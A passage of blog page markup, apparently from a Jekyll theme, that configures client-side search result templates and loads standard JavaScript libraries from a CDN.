document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
